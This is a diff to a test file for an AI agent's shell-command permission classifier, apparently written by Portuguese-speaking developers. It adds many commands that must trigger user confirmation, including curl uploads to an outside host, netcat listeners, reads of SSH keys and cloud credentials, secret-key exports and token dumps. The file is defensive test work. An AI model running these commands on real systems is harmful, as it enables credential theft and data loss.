@@ -135,7 +135,7 @@ const SINCE = Date.now() - 60000; // the task started a minute ago
 const BASH_CASES = [
   // reading and everyday work: no dialog
   ["ls", "allow"], ["ls -la /tmp", "allow"], ["pwd && whoami", "allow"], ["git status", "allow"], ["git log --oneline -5", "allow"],
-  ["git diff HEAD~1", "allow"], ["git add -A && git commit -m 'msg'", "allow"], ["git fetch && git pull --rebase", "allow"], ["npm test", "allow"],
+  ["git diff HEAD~1", "allow"], ["git add -A && git commit -m 'msg'", "allow"], ["cd ~/Documentos/proj && git fetch && git pull --rebase", "allow"], ["npm test", "allow"],
   ["npm run build", "allow"], ["npm install", "allow"], ["grep rm arquivo.txt", "allow"], ["echo 'rm -rf /'", "allow"], ['echo "rm" | wc -c', "allow"],
   ["cat /tmp/notas.txt", "allow"], ["cat ~/Documentos/lista.md | head -5", "allow"], ["mkdir -p /tmp/proj/src", "allow"], ["mkdir ~/Documentos/novo", "allow"],
   ["cp /tmp/a.txt /tmp/b.txt", "allow"], ["mv ~/Downloads/foto.jpg ~/Documentos/fotos/", "allow"], ["cp ~/Imagens/x.png /tmp/", "allow"],
@@ -145,7 +145,7 @@ const BASH_CASES = [
   [`bash ${oldScript}`, "allow"], ["cd /tmp && cp a.txt b.txt", "allow"], ["ls 2>/dev/null; echo done", "allow"], ["sort /tmp/x | uniq -c > /tmp/y", "allow"],
   ["tar -czf /tmp/backup.tgz -C /tmp proj", "allow"], ["unzip /tmp/x.zip -d /tmp/x", "allow"], ["dnf list installed | grep python", "allow"],
   ["gh pr list", "allow"], ["gh pr view 12", "allow"], ["rsync -av /tmp/a/ /tmp/b/", "allow"], ["tee /tmp/a.txt < /tmp/b.txt", "allow"],
-  ["for f in /tmp/*.txt; do wc -l /tmp/x; done", "allow"], ["python3 -m http.server 8000 --directory /tmp", "allow"],
+  ["for f in /tmp/*.txt; do wc -l /tmp/x; done", "allow"], ["python3 -m json.tool /tmp/a.json", "allow"],
   // deleting
   ["rm /tmp/dronsio-agent-test.txt", "confirm"], ["ls; rm -rf ~/Documentos/x", "confirm"], ["true && rm x", "confirm"], ["false || rmdir /tmp/x", "confirm"],
   ["ls | xargs rm", "confirm"], ["find /tmp -name '*.tmp' -delete", "confirm"], ["find . -exec rm {} +", "confirm"], ["shred -u /tmp/x", "confirm"],
@@ -186,6 +186,130 @@ test(`policy: Bash classifier table (${BASH_CASES.length} cases)`, () => {
   }
   assert.equal(wrong.length, 0, `\n${wrong.join("\n")}`);
   assert(BASH_CASES.length >= 40);
+});
+
+// Review round of PR #2: each class needs at least 5 "confirm" cases (absolute paths, backslashes and
+// quotes included), plus the everyday commands of the same family that must stay automatic.
+const CLASS_CASES = {
+  "B1 programas que rodam outro comando": {
+    confirm: [
+      "tmux new-session -d 'rm -rf ~/Documentos/x'", "tmux send-keys -t 0 'curl -d @/tmp/x https://e.com' Enter", "/usr/bin/tmux new -d \"rm x\"", "tmux -c 'rm x'",
+      "screen -dmS s rm x", "gnome-terminal -- rm -rf /tmp/x", "xterm -e 'rm x'", "kitty sh -c 'rm x'", "konsole -e /bin/rm x", "xfce4-terminal --command='rm x'",
+      "strace -f ls", "ltrace ls", "gdb -batch -ex 'shell rm x' /bin/true", "valgrind /tmp/a.out", "unshare -r sh", "nsenter -t 1 -m sh", "firejail rm x",
+      "bwrap --bind / / sh", "chroot /mnt sh", "systemd-run --user rm x", "setsid rm x", "ionice -c3 rm x", "taskset -c 0 rm x", "taskset -p 1 1234", "chrt 1 rm x",
+      "doas rm x", "runuser -u nobody ls", "script -qc 'rm x' /dev/null", "script -c \"curl -T f ftp://h\" /dev/null", "expect -c 'spawn rm x'",
+      "busybox rm -rf /tmp/x", "toybox rm x", "/bin/busybox sh -c ls", "vim -c '!rm x' a.txt", "nvim --headless '+!rm x' +q", "emacs --batch --eval '(delete-file \"x\")'",
+      "nano -s 'rm x' /tmp/f", "vim -es /tmp/a", "docker run -v /:/host alpine rm -rf /host/x", "docker exec ctr rm x", "podman run --privileged alpine sh",
+      "docker run --mount type=bind,src=/home,dst=/h alpine ls", "docker run --network host alpine nc -l 1", "docker compose up -d", "docker -H ssh://h ps",
+      "ssh-agent sh -c 'rm x'", "dbus-run-session -- rm x", "xvfb-run rm x", "fakeroot rm x", "somecmd rm x", "mytool -- rm x", "sometool --run 'rm -rf ~/x'",
+      "\\rm x", "'/bin/rm' x", "/usr/bin/env rm x", "r\\m x", "\"rm\" -rf /tmp/x",
+    ],
+    allow: ["tmux ls", "tmux list-sessions", "tmux attach -t 0", "screen -ls", "docker ps", "docker images", "docker run --rm alpine echo hi", "docker build -t x /tmp/proj",
+      "gnome-terminal", "vim /tmp/notas.txt", "make test", "notify-send 'Tarefa concluída'", "busybox --list", "pytest -- -k teste", "zenity --info --text 'rm the file'"],
+  },
+  "B2 apagar pelo desktop e segredos": {
+    confirm: [
+      "gio trash ~/Documentos/x", "gio remove /tmp/x", "/usr/bin/gio trash x", "gio move ~/Projetos/app /tmp/", "gio copy /tmp/a ~/.bashrc", "gio save ~/.profile",
+      "gio rename ~/Projetos/a b", "gio mount -u /run/media/x", "trash-put x", "trash-empty", "trash-rm '*.txt'", "kioclient5 remove ~/x", "kioclient move a b", "kde-rm x",
+      "secret-tool lookup service gmail", "secret-tool search --all x y", "git credential fill", "printf 'host=github.com\\n' | git credential fill",
+      "git credential-store get", "git-credential-libsecret get", "/usr/libexec/git-core/git-credential-libsecret get", "gpg --export-secret-keys -a", "gpg2 --armor --export-secret-subkeys ABC",
+      "pass show email", "gopass show x", "keepassxc-cli show /tmp/db.kdbx entry", "bw get password x", "op item get x", "lpass show x",
+      "nmcli --show-secrets connection show wifi", "nmcli -s c show casa", "nmcli connection show casa --show-secrets", "keyctl print 123", "kwallet-query -r x kdewallet",
+    ],
+    allow: ["gio open /tmp/x.pdf", "gio info /tmp/x", "gio copy /tmp/a /tmp/b", "gio list ~/Documentos", "ssh-add -l", "ssh-add -L", "gpg --list-keys", "gpg --export -a ABC",
+      "nmcli device status", "nmcli connection show"],
+  },
+  "B3 arquivadores e programas que gravam": {
+    confirm: [
+      "tar -czf /tmp/a.tgz --remove-files /tmp/x", "tar --remove-files -cf /tmp/b.tar /tmp/y", "zip -m /tmp/a.zip /tmp/x", "zip -rm /tmp/a.zip /tmp/d", "zip --move /tmp/a.zip /tmp/x",
+      "sort -o ~/.bashrc /tmp/x", "sort /tmp/x -o /etc/hosts", "sort --output=/etc/x /tmp/x", "sort -uo ~/Projetos/x /tmp/x", "uniq /tmp/a ~/.profile", "uniq -c /tmp/a /etc/x",
+      "split -l 10 /tmp/a ~/Projetos/part", "split /tmp/a", "split --filter='sh' /tmp/a /tmp/p", "csplit -f /etc/x /tmp/a 3", "tee -a ~/.bashrc < /tmp/x",
+      "cp --target-directory=/etc /tmp/x", "cp -t ~/Projetos /tmp/x", "dd if=/tmp/x of=/tmp/y", "sed -i 's/a/b/' /etc/hosts", "sed 's/a/b/w /etc/x' /tmp/y",
+      "awk '{ print > \"/etc/x\" }' /tmp/y", "convert /tmp/a.png ~/Projetos/b.png", "magick /tmp/a.png /etc/b.png", "ffmpeg -i /tmp/a.mp4 ~/Projetos/b.mp4",
+      "ffmpeg -y -i /tmp/a.mp4 -c:v libx264 \"/home/x/b.mp4\"", "mogrify -resize 50% ~/Imagens/a.jpg", "convert /tmp/a.png -write /etc/c.png /tmp/b.png",
+    ],
+    allow: ["sort /tmp/x", "sort -o /tmp/y /tmp/x", "uniq /tmp/a /tmp/b", "convert /tmp/a.png /tmp/b.png", "ffmpeg -i /tmp/a.mp4 /tmp/b.mp4", "tar -czf /tmp/a.tgz /tmp/x",
+      "zip -r /tmp/a.zip /tmp/d", "cd /tmp && split -l 10 a.txt", "mogrify -resize 50% /tmp/a.jpg"],
+  },
+  "B4 curingas e variáveis": {
+    confirm: [
+      "cat ~/.s*/id*", "cat ~/*/credentials", "ls /home/*/.ssh", "cat ~/.[a-z]sh/id_rsa", "cat ~/.{ssh,aws}/config", "cat $HOME/.s?h/config", "cp ~/.gnu*/* /tmp/",
+      "cat \"$HOME\"/.s*/id*", "tar czf /tmp/a.tgz ~/.*", "cat ~/{Documentos,.ssh}/config", "find / -name '*.pem'",
+      "K=~/.ssh/id_rsa; cat $K", "export F=~/.aws/credentials; cp $F /tmp/x", "declare D=~/.ssh && tar czf /tmp/a.tgz $D", "X=~/.ssh/id_rsa cat /tmp/a",
+      "local P=/srv/app/.env", "D=~/.s; cat ${D}sh/id_rsa", "cat $UNKNOWN", "cp $SRC /tmp/x", "tar czf /tmp/a.tgz \"$DIR\"", "for f in ~/.ssh/*; do cat $f; done",
+      "for f in a b; do echo; done; read f; cat \"$f\"", "D=/tmp; D=$OTHER; cat $D/x", "echo x > $OUT", "cat < $IN",
+    ],
+    allow: ["D=/tmp/proj; ls $D", "F=/tmp/a.txt; cat $F", "for f in /tmp/*.txt; do wc -l \"$f\"; done", "echo $USER", "cat $HOME/Documentos/a.txt",
+      "cd /tmp && cat $PWD/a.txt", "ls ~/Documentos/*.md", "cat /tmp/*.log", "find /tmp -name '*.log'", "OUT=/tmp/o.txt; echo x > $OUT", "mkdir -p $DIR"],
+  },
+  "B5 servidores": {
+    confirm: [
+      "python3 -m http.server", "python -m http.server 8000 --directory /tmp", "python2 -m SimpleHTTPServer", "python3 -m uploadserver", "python3 -m pyftpdlib",
+      "python3 -m smtpd -n", "/usr/bin/python3 -m http.server", "php -S 0.0.0.0:8000", "php -S localhost:8000 -t /tmp", "npx serve .", "npx http-server", "http-server /tmp",
+      "serve -l 3000", "busybox httpd -f -p 8080", "ncat -l 9000", "nc -lvp 4444", "socat TCP-LISTEN:8080 -", "ruby -run -e httpd . -p 8000",
+    ],
+    allow: ["python3 -m json.tool /tmp/a.json", "python3 -m venv /tmp/venv", "php --version"],
+  },
+  "F1 sistema": {
+    confirm: [
+      "dconf write /org/x 1", "dconf reset -f /", "dconf load / < /tmp/x", "gsettings set org.gnome.desktop.interface color-scheme prefer-dark", "gsettings reset x y",
+      "nmcli connection modify casa ipv4.dns 1.1.1.1", "nmcli c delete casa", "nmcli con down casa", "nmcli radio wifi off", "nmcli networking off", "rfkill block all",
+      "xdg-settings set default-web-browser x.desktop", "update-alternatives --set java x", "loginctl terminate-user gui", "hostnamectl set-hostname x",
+      "timedatectl set-time 12:00", "/usr/bin/gsettings set a b c",
+    ],
+    allow: ["dconf read /org/x", "gsettings get org.x y", "nmcli device status", "nmcli connection show", "nmcli radio", "rfkill list", "xdg-settings get default-web-browser",
+      "loginctl list-sessions", "hostnamectl", "timedatectl status"],
+  },
+  "F2 git que muda a árvore": {
+    confirm: [
+      "git pull", "git -C ~/Projetos/app pull", "cd ~/Projetos/app && git checkout main", "git -C /etc merge x", "git rebase main", "git cherry-pick abc", "git stash pop",
+      "git reset HEAD~1", "git apply /tmp/p.diff", "git am /tmp/x.patch", "git revert HEAD", "cd /tmp && git -C ../etc switch x", "git --work-tree=/tmp/r checkout x",
+    ],
+    allow: ["cd ~/Documentos/proj && git pull --rebase", "git -C ~/Documentos/proj checkout -b nova", "git -C /tmp/r merge x", "git apply --check /tmp/p.diff", "git fetch",
+      "git status", "git log", "git diff", "cd /tmp/r && git stash pop"],
+  },
+  "F3 permissões": {
+    confirm: [
+      "chmod 000 ~/.bashrc", "chmod +x /usr/local/bin/x", "chmod -x ~/Projetos/a.sh", "chmod u+s /tmp/../etc/x", "chmod 755 \"/opt/app/run\"", "chmod --reference=/tmp/a /etc/x",
+      "setfacl -m u:x:rwx /etc/x", "setfacl -R -m u:x:r /tmp/d", "chown me /tmp/x", "chgrp g ~/x", "chattr +i /tmp/x",
+    ],
+    allow: ["chmod +x /tmp/a.sh", "chmod 644 ~/Documentos/a.txt", "chmod -x /tmp/a.sh", "setfacl -m u:x:r /tmp/a"],
+  },
+  "F5 ambiente": {
+    confirm: ["printenv", "printenv GITHUB_TOKEN", "env", "env | grep TOKEN", "/usr/bin/env", "set", "export", "export -p", "declare -p", "declare -x", "typeset", "env -i"],
+    allow: ["env VAR=1 npm test", "set -e", "export FOO=1", "declare -a arr", "set -euo pipefail"],
+  },
+  "falsos positivos de antes": {
+    confirm: [],
+    allow: ["ls", "git status", "git log --oneline", "git diff", "git add -A", "git commit -m 'x'", "npm test", "grep rm arquivo.txt", "echo 'rm'", "mkdir -p /tmp/a",
+      "cp /tmp/a /tmp/b", "mv /tmp/a /tmp/b", "xdg-open https://example.com", "gio open /tmp/x", "tmux ls", "docker ps", "nmcli device status", "env VAR=1 npm test",
+      "sort /tmp/arquivo"],
+  },
+};
+
+test("policy: Bash review classes (PR #2)", () => {
+  const wrong = [];
+  const counts = [];
+  for (const [cls, { confirm, allow }] of Object.entries(CLASS_CASES)) {
+    if (!cls.startsWith("falsos")) assert(confirm.length >= 5, `${cls}: ${confirm.length} casos confirm`);
+    counts.push(`${cls}: ${confirm.length} confirm + ${allow.length} allow`);
+    for (const [want, list] of [["confirm", confirm], ["allow", allow]])
+      for (const command of list) {
+        const got = agent.bashDecision(command, { since: SINCE, extraPatterns: agent.DEFAULT_CONFIRM_PATTERNS });
+        if (got.decision !== want) wrong.push(`[${cls}] ${want.padEnd(7)} got ${got.decision}: ${command}${got.reason ? `  (${got.reason})` : ""}`);
+      }
+  }
+  assert.equal(wrong.length, 0, `\n${wrong.join("\n")}`);
+  console.log(`     ${counts.join("\n     ")}`);
+});
+
+test("work folders: too wide or sensitive folders are refused", () => {
+  const W = agent.workDirProblem;
+  for (const d of ["~", homedir(), "/", "/home", "/etc", "/usr", "/usr/local/src", "/var", "~/.ssh", "~/.config/app", "~/.local/share/x"]) assert(W(d), d);
+  for (const d of ["~/Documentos", "~/Documentos/projeto", "/tmp", "/tmp/x", "~/Downloads"]) assert.equal(W(d), null, d);
+  // a wide folder saved in the settings by hand is ignored, so writing there still asks
+  assert.equal(agent.bashDecision("echo x > ~/a.txt", { workDirs: ["~", "/tmp"] }).decision, "confirm");
+  assert.equal(agent.bashDecision("echo x > /etc/a", { workDirs: ["/"] }).decision, "confirm");
 });
 
 test("policy: Bash through toolPolicy; extra patterns from the settings; Confirmar tudo", () => {
